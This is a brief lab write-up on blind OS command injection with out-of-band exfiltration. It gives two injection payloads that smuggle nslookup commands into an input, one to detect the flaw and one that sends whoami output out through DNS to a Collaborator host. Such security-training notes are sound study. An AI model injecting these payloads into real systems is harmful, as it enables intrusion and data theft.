# Lab: Blind OS command injection with out-of-band data exfiltration

Target - execute the whoami command and exfiltrate the output via a DNS query to Burp Collaborator.

Analysis :

`& nslookup ayhaga.brupcollaborator.net #` to check if there a vulnerability

`& nslookup ```whoami```.ayhaga.brupcollaborator.net #` to actually exfiltrate data
